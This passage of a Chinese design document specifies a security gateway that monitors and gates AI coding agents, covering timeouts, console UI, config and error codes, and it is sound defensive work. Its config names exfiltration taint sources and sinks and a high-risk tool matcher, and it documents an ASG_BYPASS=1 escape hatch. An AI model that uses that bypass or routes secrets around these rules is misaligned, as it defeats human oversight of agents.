> 本节所有数字来自 `docs/VERIFICATION.md` Task 0c A/B 实测（n=20，同一时刻、同 curl 方法、fresh-process 模型），不得拍脑袋修改。Task 2b/3/6 的 `ASG_L1_TIMEOUT`/`ASG_L2_TIMEOUT` 均以此为准，支持 env 覆盖。

#### 4.7.1 实测基线（fresh TLS，每次新进程新握手，模拟 `asg-guard`）

| 传输 | n | p50 | p90 | max | mean | 来源 | 备注 |
|------|---|-----|-----|-----|------|------|------|
| **cpolar `vip.cpolar.cn`（主入口，现状）** | 20 | **1.663s** | **2.981s** | **5.404s** | 2.012s | `VERIFICATION.md: Step 3 cp.txt` / 任务背景 | 与最终基线 p50=1.89/p90=3.74 量级一致，去异常值后 p50=1.536/p90=2.820 |
| **CF `trycloudflare.com`（WSL/1.1.1.1，对比）** | 20 | **0.872s** | **1.381s** | **5.402s** | 1.150s | `VERIFICATION.md: Step 3 cf.txt` | 快 47%/54%，但未达 <0.3s 判据 |
| 本地 `/api/activity` BLOCK 全链路 | 10 | **0.016s** | — | 0.041s | — | `VERIFICATION.md: Step 0.5` / 任务背景 | 证明隧道占 >99% |
| 本地 `127.0.0.1:8090/healthz` | — | **0.002s** | — | 0.003s | — | Step 4 对照组 | LAN 直连地板 |
| CF 分段 `tls-tcp` | 3 | — | — | — | **0.423s** (avg) | `VERIFICATION.md: Step 4 CF 3次` | 判据 >0.1s 未达 |
| cpolar 分段 `tls-tcp` | 3 | — | — | — | **1.330s** (avg) | `VERIFICATION.md: Step 4 cpolar 3次` | 波动大 0.78–1.86s |

对照组（同网络 fresh）：`cloudflare.com` tls-tcp 0.399–0.836s / `trycloudflare.com` 0.396–0.411s / `google.com` 0.406–2.04s — 证明 **0.42s 是本机 fresh TLS 普遍地板**，非 CF 独有。

#### 4.7.2 推导逻辑

- **目标**：误拒率 `P(RTT > 超时) < 1%` → 超时需 > p99。
- **n=20 估算**：无足够样本直接取 p99，按保守估计 `p99 ≈ max`（20 样本中最大值≈ 95% 分位，上界当 p99 用）。因此：
  - cpolar p90=2.981 → p99≈max 5.404s
  - CF p90=1.381 → p99≈max 5.402s（含单次 5.4s 异常重传，去异常值后 CF p90=1.375、cpolar p90=2.820，max 仍是长尾证据）
- **fail-open vs fail-closed**：
  - L1（一般写，`Write`/`Edit`）→ `fail-open`：超时放行，误拒无代价，可取接近 p50 偏保守的值，减少用户等待。
  - L2（高危，`Bash`/`WebFetch`/敏感路径）→ `fail-closed`：超时拒绝，误拒会打断用户，必须覆盖 p90 以上，宁可让用户多等 2s 也不误拒。
- **fresh TLS 地板 0.42s 使 p50<0.3s 不可达**：
  - 分段实测：TCP ~9ms（LA 出口→sjc05/44.0.1.x 近），但 `tls-tcp` CF 0.423s / cpolar 1.33s，TTFB 再 +0.47–1.66s。0.42s 在所有外网 fresh TLS 中复现（对照组同为 0.40–0.43s），且 `requests.Session` 复用 5 次仍 0.43s，说明是 `wintun/tun2socks` 代理的固定 TLS 终结/复加解密成本。
  - 计划 §0.6 判定 `p50<0.3s` 在 fresh-process 模型下不可达 → **CF 未达标，cpolar 保持主入口**；<0.3s 只能靠 **HTTP hook 连接池**（`type:"http"`，CC 进程自持连接，省 0.42s 握手）实现，见 4.7.4。

#### 4.7.3 误拒率估算

| 传输 | L2 超时 | p90 | max(≈p99) | P(RTT> L2) 估算 | 结论 |
|------|---------|-----|-----------|----------------|------|
| cpolar 主入口 | **5s** | 2.981s | 5.404s | **≈1/20 =5%**（本次 1/20 >5s） | **不满足 <1%**，但已是最小可用值；p90 已覆盖，剩余 5% 长尾靠 `ASG_BYPASS=1` 逃生舱 + 事后补报可见性缓解；HTTP hook 可降至 2s 且 <1% |
| CF 备用 | **3s** | 1.381s | 5.402s(异常) / 去异常 1.375 | 含异常≈5%，去异常≈0% | 3s 远超去异常 p90，若无 5.4s 异常则 <1%；双入口时可作加速 |
| LAN | **2s** | 0.003s | 0.003s | **≈0%** | 500×余量，<1% 轻松满足 |
| HTTP hook（预期，复用） | **2s** | ~0.4s(预估省 0.42s) | ~1.0s | **<1%** | 连接复用省 0.42s 地板后接近 LAN，1s/2s 即满足 |

- **L1 误拒无害**（fail-open）：cpolar L1=3s 覆盖 p90=2.98 仅边际（`P(RTT>3s)≈10%`：20 样本中 2/20 >2.98，其中 1 接近 2.98、1 为 5.4），但超时仅意味着多等 3s 后放行，不阻塞用户，故可接受。

#### 4.7.4 超时参数锁定表（Task 2b/3/6 统一入口）

| 传输 | 实测 p50 | L1 超时（一般写，fail-open） | L2 超时（高危，fail-closed） | Hook 超时 | 选型依据 | env 覆盖 |
|------|---------|------------------------------|------------------------------|-----------|----------|----------|
| **LAN 直连** `192.168.101.100:8090` | 0.002s | **1s** | **2s** | L+3 = 4s/5s | p50 的 **500×** 余量；本地 BLOCK 全链路仅 16ms，1s/2s 远超 p99=0.04s，误拒 0% | `ASG_L1_TIMEOUT` / `ASG_L2_TIMEOUT` |
| **CF Tunnel** `trycloudflare.com`（备用/双入口） | 0.872s | **2s** | **3s** | 5s/6s | L1 2s > p90=1.381 (+45%)；L2 3s > 2×p90，去异常后 <1%，含异常~5%；tls-tcp 0.423 地板已计入 | 同上（`PUB_URL` 含 cloudflare 时 `asg-probe-transport` 自动选 2/3） |
| **cpolar** `vip.cpolar.cn` **（当前主入口）** | **1.663s** | **3s** | **5s** | 6s/8s | L1 3s 刚覆盖 p90=2.981（边际）；L2 5s 覆盖 p90 但对 max=5.404 仍有 ~5% 误拒，需在文档与 `deny_unreachable` 提示中明确“**误拒率约 5%，靠 `ASG_BYPASS=1` 逃生舱缓解，且 HTTP hook 可降至 1s 以内**”；`asg-probe-transport` 公网默认 3/5，`asg-guard` 默认亦 3/5 | 同上 |
| **HTTP hook 快路径** `type:"http"`（CC 原生连接池，预期） | —（复用时省 0.42s 地板，预期 p50~0.3–0.5s） | **1s** | **2s** | 4s/5s | 连接复用省去 fresh TLS 0.42s 地板，接近 LAN 量级，故与 LAN 同档 1s/2s 即可 <1%；`ASG_USE_HTTP_HOOK=1` 时 `asg-probe-transport` 选 1/2 | `ASG_USE_HTTP_HOOK` / `ASG_HTTP_HOOK_URL` |

- **Hook 超时** = `curl max-time +3s` 裕量（`asg-guard` 中 `curl --max-time $TIMEOUT`，harness hook kill 在 TIMEOUT+3），防止 harness 先杀脚本。
- **所有超时均有实测支撑**，来源见 4.7.1 表；不得拍脑袋下调 L2（尤其 cpolar 5s 已是底线，2s 会误拒 ~30%）。
- **双入口探测**：`scripts/asg-probe-transport` 按 URL 自动择优（LAN 1/2 → HTTP 1/2 → CF 2/3 → cpolar 3/5），env `ASG_L1_TIMEOUT`/`ASG_L2_TIMEOUT` 始终最高优先级覆盖。

---

## 5. M4 控制台重构

### 5.1 技术栈

| 项 | 选型 | 出处 |
|---|---|---|
| 构建 | Vite 6 + React 19 + TypeScript | — |
| UI | shadcn/ui + Tailwind v4 | `shadcn-ui/ui` |
| 路由 | React Router 7 | — |
| 数据 | TanStack Query（轮询兜底）+ 原生 `EventSource`（SSE 实时） | — |
| 图表 | Recharts | `recharts/recharts` |
| **图谱** | **Cytoscape.js**（`cytoscape/cytoscape.js`，成熟、支持大图布局与本体论层级） | 核心卖点 |
| 打包 | `go:embed web/dist` | 保持单二进制 |

**目录**：
```
web/
  src/
    pages/  Dashboard.tsx  AgentDetail.tsx  Policies.tsx
            Graph.tsx  Findings.tsx  Sessions.tsx
    components/  AgentTable.tsx  ActivityChain.tsx  VerdictBadge.tsx
                 ModelBadge.tsx   OntologyGraph.tsx
    lib/  api.ts  sse.ts  types.ts
  vite.config.ts
```

### 5.2 SSE 实时推送

```
GET /api/stream          # text/event-stream
event: agent_update      data: {agent_id, status, model, last_activity}
event: activity          data: {agent_id, session_id, step:{...}}
event: verdict           data: {trace_id, verdict, policy, risk}
```
服务端：`internal/webui/stream_api.go`，内存 fan-out（`map[chan Event]struct{}` + `sync.RWMutex`），客户端断线自动清理。轮询作为降级兜底。

### 5.3 页面与子系统 UI（用户要求：四个子系统补 UI）

| 页面 | 消费的现有 API | 内容 |
|---|---|---|
| Dashboard | `/api/agents` `/api/stream` | agent 表（双指示灯、模型+来源徽标）、风险计数 |
| AgentDetail | `/api/agents/detail` | **工作链路时间线**（每步工具+判定+taint）、模型变更历史、会话列表 |
| Policies | `/api/policies` | per-agent 策略矩阵，三态动作切换 |
| **Graph** | `/api/kg/graph/nodes` `/edges` `/path` `/ask` | **semantic 本体论图谱（核心卖点）**，Cytoscape 渲染，支持按 taint 溯源路径高亮 |
| Findings | `/api/judge/findings` `/api/monitor/findings` | judge + monitor 两个子系统的发现列表 |
| Sessions | `/api/sessions` `/api/trajectory` | 会话轨迹回放 |

告警**先不接外部出口**（用户答复），仅前端高亮 + 计数。

---

## 6. M5 运维加固

### 6.1 进程自愈（Windows）

**选型**：`nssm`（Non-Sucking Service Manager，免费）
**托管四进程**：

| 服务名 | 可执行 | 端口 | 依赖 |
|---|---|---|---|
| `ASG-Gateway` | `bin/gateway.exe serve -config deploy/config.dev.yaml` | 8090 | — |
| `ASG-Connect` | `bin/asg-connect.exe serve -config connect.yaml` | 8181 | — |
| `ASG-Cpolar` | `cpolar.exe start-all` | — | Gateway |
| `ASG-KGWorker` | `python internal/kgbridge/asg_kg_worker.py` | 8902 | — |

配置：`AppExit Default Restart`、`AppRestartDelay 5000`、`AppStdout/AppStderr` 轮转日志。
脚本：`scripts/install-services.ps1` / `uninstall-services.ps1`。

### 6.2 测试补齐（用户答复：功能优先，测试跟进）

**唯一硬性要求**：`cmd/asg-connect` 从 3% → 60%+（这里出过"永远 hy3"的生产 bug）。
优先补：`route()` 路由选择、`sessionID` 兜底、`handleLLM` 引擎接入、`init/uninstall` 幂等与回滚。

---

## 7. 配置项总表

### 7.1 网关 `deploy/config.dev.yaml`（新增项标 ★）

```yaml
listen: ":8090"
llm_upstream_url: "http://127.0.0.1:8181"
upstream_command: ["./bin/upstream-mcp"]

cedar_policy_path: "./deploy/policies/permission.cedar"
rules_path: "./deploy/rules/pipelock-community.yaml"
include_experimental_rules: false

taint_sources: ["get_inbox", "read_secret", "fetch", "read_file"]
taint_sinks:   ["send_email", "http_post", "export_all_users"]

behavior_sidecar_url: "http://127.0.0.1:8901"
behavior_fail_open: true

★ outputguard_sidecar_url: "http://127.0.0.1:8903"   # llm-guard
★ outputguard_fail_open: true

kg_python_bin: "python"
kg_worker_script: "internal/kgbridge/asg_kg_worker.py"
kg_semantica_path: "D:/proj/semantica"
kg_port: 8902

★ storage:
★   driver: "sqlite"                  # sqlite | jsonl(legacy)
★   dsn: "./data/asg.db"
★   max_events: 200000                # 条数上限轮转
★   audit_jsonl: true                 # 保留合规审计原件
★   audit_jsonl_max_mb: 64
★   audit_jsonl_keep: 5

★ agent_status:
★   activity_window: "5m"
★   heartbeat_window: "2m"

★ sensitive_tools: ["Bash", "Write", "Edit", "WebFetch"]
★ sensitive_action: "confirm"          # log | alert | confirm | block
```

### 7.2 探针 `connect.yaml`

```yaml
hub_url: "https://asg-gateway.vip.cpolar.cn"
tenant_name: "local"
tenant_key: "<REDACTED>"
agent_id: ""                  # 空则自动 <machine-id>-<harness>

★ install:
★   detail_level: "tool"      # minimal | tool | full
★   sample_rate: 1.0
★   events: ["PostToolUse", "SessionStart", "Stop"]

providers:                     # Proxy 通道（可选）
  - name: opencode-zen
    base_url: "https://opencode.ai/zen/go/v1"
    api_key: "<REDACTED>"
    default_model: "hy3"
    # allowed_models / model_map 已永久删除：模型必须透传
```

### 7.3 客户端超时 `~/.asg/config`（Task 0b 实测锁定，见 §4.7）

```sh
# 由 scripts/asg-probe-transport 按实测传输自动写入，env 覆盖优先
ASG_HUB="https://asg-gateway.vip.cpolar.cn"   # 或 http://192.168.101.100:8090 / http hook URL
ASG_TRANSPORT="public"                         # lan | public | http
ASG_L1_TIMEOUT=3                               # L1 一般写 fail-open（cpolar 主入口 3s，LAN 1s，CF 2s，HTTP 1s）
ASG_L2_TIMEOUT=5                               # L2 高危 fail-closed（cpolar 主入口 5s，LAN 2s，CF 3s，HTTP 2s）
ASG_GUARD_TIMEOUT=5                            # 兼容旧变量，等同 ASG_L2_TIMEOUT
ASG_GUARD_MATCHER="Bash|Write|Edit|WebFetch|NotebookEdit"  # public 收窄；LAN 为 "*"
# HTTP hook 快路径（仅 Claude Code）
ASG_USE_HTTP_HOOK=0
ASG_HTTP_HOOK_URL=""
```

| 变量 | 默认（cpolar 主入口） | LAN | CF 备用 | HTTP hook | 说明 |
|------|----------------------|-----|---------|-----------|------|
| `ASG_L1_TIMEOUT` | **3** | 1 | 2 | 1 | L1 超时，`asg-guard` 中 `curl --max-time`；fail-open |
| `ASG_L2_TIMEOUT` | **5** | 2 | 3 | 2 | L2 超时，`asg-guard` 中 `curl --max-time`；fail-closed，超时输出 `ASG_UNREACHABLE` deny JSON |
| `ASG_GUARD_TIMEOUT` | 5 | 2 | 3 | 2 | 旧变量兼容，优先级低于 L1/L2 |
| `ASG_TRANSPORT` | public | lan | public | http | `asg-probe-transport` 写入，仅记录 |

> 实测依据：cpolar p50=1.663/p90=2.981/max=5.404，CF p50=0.872/p90=1.381/max=5.402，LAN p50=0.002，tls-tcp 地板 0.423s（详见 §4.7.1）。L2=5s 在 cpolar 上误拒率约 5%（1/20），靠 `ASG_BYPASS=1` 逃生舱缓解，HTTP hook 可降至 1–2s 内 <1%。

---

## 8. 错误码总表

| code | axis | 触发 | agent 侧动作 |
|---|---|---|---|
| `DATA_EXFIL_RISK` | data_network | taint 数据流向外部 sink | BLOCK |
| `SSRF_BLOCKED` | data_network | 目标为内网/元数据地址 | BLOCK |
| `SECRET_IN_ARGS` | data_network | 参数含密钥模式 | REDACT |
| `PII_DETECTED` | data_network | llm-guard PII 命中 | REDACT |
| `PROMPT_INJECTION` | data_network | llm-guard 注入检测 | BLOCK |
| `PERMISSION_DENIED` | permission | Cedar 拒绝 | BLOCK |
| `RESOURCE_OUT_OF_SCOPE` | permission | 越权资源 | BLOCK |
| `SENSITIVE_OP_CONFIRM` | permission | 敏感工具需审批 | CONFIRM |
| `CAUSAL_CHAIN_VIOLATION` | behavior | Invariant 因果规则命中 | BLOCK |
| `TRAJECTORY_ANOMALY` | behavior | 轨迹异常 | ALERT |
| `ENGINE_UNAVAILABLE` | — | FailClosed 引擎不可用 | BLOCK |

---

## 9. 场景矩阵

| 场景 | 通道 | 可见性 | 管控力度 | 备注 |
|---|---|---|---|---|
| Mac + Claude Code + cc-switch | Hook | 工具链路、会话、活动 | Hook 可阻断工具（PreToolUse 同步 hook 输出 `permissionDecision:"deny"`） | 模型 = self-reported；**零 sudo / 零二进制 / 零常驻进程** |
| 本机 + OpenCode | Hook + OTLP | 链路 + token/cost | 同上 | 模型 = self-reported（OTLP span） |
| 自研 agent 愿改 base_url | Proxy | **全量请求/响应** | **三轴全生效** | 模型 = gateway-observed ✅；探针装 `~/.asg/bin/`，仍不需 sudo |
| 通过 `/mcp` 的工具调用 | MCP | 工具参数与结果 | 三轴全生效 | 现状已支持 |
| 离线机器 | — | 显示 offline（不消失） | — | 仅手动删除 |
| 一机多 harness | 各自 Hook | **每 harness 一行** | 各自策略 | agent_id = machine-id + harness |
| 多租户 SaaS | 全部 | 按 tenant_key 隔离 | per-agent 策略 | `internal/authn` 已有租户模型 |

### 9.1 部署形态硬约束（不可违反）

以下每一条都对应一次真实事故，实现时必须遵守：

| 约束 | 违反后果 |
|---|---|
| 上报脚本不得向 stdout/stderr 写任何内容 | harness TUI（Ink）光标错乱 → 输入框乱码 |
| 不得设置任何全局 `OTEL_*` 环境变量 | 同上（OTel SDK 诊断日志默认 INFO 写 console） |
| 不得整文件覆盖 harness 配置 | 破坏用户的模型路由代理与凭证 → agent 直接不可用 |
| 观察路径永远 `exit 0` | 上报故障演变成 agent 故障 |
| 不得用 PowerShell `Out-File utf8` 写 `data/` 下 JSON | BOM 导致 gateway 启动崩溃 |
| 模型必须透传，禁止保底重映射 | 控制台所有 agent 显示同一个模型 |
| **注入脚本必须显式接收目标根目录参数，不得依赖 `Path.home()` / `$HOME`** | **见下方 9.2 —— 开发机实测时污染了真实配置** |

### 9.2 实测记录与踩坑（2026-08-28）

**已实测通过的部分**（在隔离目录 `%TEMP%/asgtest` 内，模拟含 `env.ANTHROPIC_BASE_URL` + `env.ANTHROPIC_AUTH_TOKEN` + `permissions` 的真实配置）：

| 验证项 | 结果 |
|---|---|
| JSON 合并保留原配置 | ✅ `env` / `permissions` 全部完整保留 |
| 幂等性（重复执行） | ✅ 输出 `already installed, skip`，hook 数量保持 1 不增长 |
| 回滚（无备份路径） | ✅ 精确移除 3 个 ASG hook，`asg-report` 残留检查 = `False`，`env`/`permissions` 完好 |
| 上报脚本静默性 | ✅ `MARKER-START` 与 `MARKER-END exit=0` 之间零输出 |
| 端到端上报 | ✅ 网关 `last_activity` 从 `02:02:22` 推进到 `03:43:02` |

**踩到的坑（实现 `harness.Install()` 时必须规避）**：

1. **Windows 上 `pathlib.Path.home()` 读 `USERPROFILE`，不读 `HOME`**
   测试时用 `export HOME=$PWD` 试图隔离，但 Python 仍解析到真实的 `C:\Users\yyyyc`，**导致注入脚本写进了开发机真实的 `~/.claude/settings.json`**（已用回滚逻辑还原，`PreToolUse` 原有 hook 完好）。
   → **实现要求**：`harness.Install()` / 注入脚本必须**显式接收目标根目录参数**（`sys.argv[1]` 或 Go 侧显式传路径），禁止内部调用 `Path.home()`。这既是测试隔离的需要，也是未来支持 `--home` 覆盖的基础。

2. **MSYS/git-bash 路径不会自动转换给原生程序**
   `python - "$PWD"` 传入 `/c/Users/...` 形式，原生 Python 解析成 `\tmp\asgtest` 而失败。
   → **实现要求**：Windows 侧传路径给原生工具前用 `pwd -W` / `cygpath -w` 转成原生形式。远端 macOS/Linux 无此问题，但跨平台安装器需处理。

3. **回滚逻辑本身是可靠的**
   这次意外污染恰好实测了 9.2 表格里的「回滚」路径 —— 精确移除生效，原有 `PreToolUse` hook 与 `env` 配置零损伤。这条回滚路径已被真实场景验证过一次。

---

## 10. 实施顺序与停止点

```
M1 接入闭环   → 远端一次安装，链路可见，可回滚
M2 存储显示   → SQLite + 模型真值标注 + 砍回执
M3 管控落地   → 三轴上 LLM 路径 + Invariant + llm-guard + per-agent 策略  ★核心
M4 控制台     → React + SSE + 本体论图谱  ★卖点
M5 运维       → nssm 自愈 + 探针测试补到 60%
```

**当前状态：设计完成，等待开工指令。**
